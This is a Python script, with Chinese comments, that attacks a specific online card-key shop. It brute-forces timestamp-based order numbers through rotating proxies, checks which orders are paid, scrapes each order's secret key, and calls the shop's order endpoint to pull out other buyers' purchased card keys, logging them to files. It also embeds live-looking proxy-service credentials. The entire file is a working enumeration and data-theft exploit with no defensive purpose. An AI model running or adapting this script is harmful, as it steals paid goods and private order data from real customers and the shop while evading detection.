#!/usr/bin/env python3
"""
hmjf.lol 已付款订单密集扫描
- submit.php 判存（window.location 且非「不存在」）
- getshop.php 判付款（非「未付款」或有 kminfo）
- query 页提取 showOrder(id,skey) → ajax order 拉卡密
"""
import json, os, re, subprocess, time
from datetime import datetime, timedelta

OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/kami_mine_20260716")
ENV_FILE = "/data/config/proxy.env"
FETCH_SH = "/data/automation/bin/qg-proxy-fetch.sh"
BASE = "https://hmjf.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"

os.makedirs(OUT, exist_ok=True)
FOUND = f"{OUT}/paid_found.jsonl"
LOG = open(f"{OUT}/paid_dense.log", "a", buffering=1)

def log(m):
    print(m, flush=True)
    LOG.write(m + "\n")

def lp():
    for line in open(ENV_FILE):
        if line.startswith("PROXY_URL="):
            return line.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()
N = 0

def refresh():
    global PX
    env = {**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"}
    subprocess.run(["bash", FETCH_SH], capture_output=True, env=env)
    PX = lp()
    time.sleep(1.5)

def curl(url, post=None, timeout=12):
    global N, PX
    N += 1
    if N % 80 == 0:
        refresh()
    cmd = ["curl", "-s", "--max-time", str(timeout), "-x", PX, "-A", UA, "-H", f"Referer: {REF}"]
    if post is not None:
        cmd += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 4).stdout or ""
    except Exception:
        return ""

def exists(tn):
    h = curl(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
    return "window.location" in h and "该订单号不存在" not in h

def check_paid(tn):
    gs = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
    paid = False
    kminfo = None
    try:
        j = json.loads(gs)
        if j.get("kminfo"):
            paid, kminfo = True, j["kminfo"]
        elif j.get("msg") != "未付款" and j.get("code") != -1:
            paid = True
    except Exception:
        paid = gs and "未付款" not in gs and "kminfo" in gs.lower()
    qh = curl(f"{BASE}/?mod=query&data={tn}")
    show = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", qh)
    oid, sk = (show.group(1), show.group(2)) if show else (None, None)
    if oid and sk:
        oh = curl(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
        try:
            oj = json.loads(oh)
            if oj.get("kminfo"):
                paid, kminfo = True, oj["kminfo"]
        except Exception:
            pass
    rec = {"trade_no": tn, "getshop": gs[:200], "paid": paid, "kminfo": kminfo, "id": oid, "skey": sk}
    with open(FOUND, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    if paid or kminfo:
        log(f"*** PAID {tn} kminfo={str(kminfo)[:80]} id={oid}")
        with open(f"{OUT}/paid_hits.json", "a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    else:
        log(f"EXIST unpaid {tn}")
    return rec

def scan_prefix(prefix, step=1):
    """prefix = YYYYMMDDHHMMSS (14 chars), scan 3-digit suffix"""
    hits = []
    for s in range(0, 1000, step):
        tn = f"{prefix}{s:03d}"
        if len(tn) != 17:
            continue
        if exists(tn):
            hits.append(tn)
            check_paid(tn)
        time.sleep(0.08)
    return hits

def scan_day(date_str, hours=None, suffix_step=250):
    if hours is None:
        hours = range(8, 24)
    found_any = 0
    for h in hours:
        for m in range(60):
            bucket_hit = False
            for sec in range(60):
                prefix = f"{date_str}{h:02d}{m:02d}{sec:02d}"
                for s in range(0, 1000, suffix_step):
                    tn = f"{prefix}{s:03d}"
                    if not exists(tn):
                        continue
                    bucket_hit = True
                    found_any += 1
                    log(f"  hit prefix {prefix} via {tn}")
                    for s2 in range(0, 1000):
                        tn2 = f"{prefix}{s2:03d}"
                        if exists(tn2):
                            check_paid(tn2)
                        time.sleep(0.05)
                    break
                if bucket_hit:
                    break
            if m % 15 == 0:
                log(f"  {date_str} {h:02d}:{m:02d} req={N}")
    return found_any

def main():
    log(f"[start] {datetime.now().isoformat()}")
    if not PX:
        refresh()

    # Phase 1: recent 3 days — all seconds per minute
    log("[P1] 20260714-16 dense (all seconds)")
    for d in ("20260714", "20260715", "20260716"):
        scan_day(d, hours=range(0, 24), suffix_step=250)

    # Phase 2: last 90 days peak hours
    log("[P2] 90d peak hours")
    end = datetime(2026, 7, 13)
    for day in range(90):
        d = (end - timedelta(days=day)).strftime("%Y%m%d")
        n = scan_day(d, hours=range(10, 23), suffix_step=333)
        if n:
            log(f"  day {d} exist_buckets={n}")
        if day % 5 == 0:
            log(f"  P2 progress day={d}")

    log(f"[done] {datetime.now().isoformat()} requests={N}")
    LOG.close()

if __name__ == "__main__":
    main()
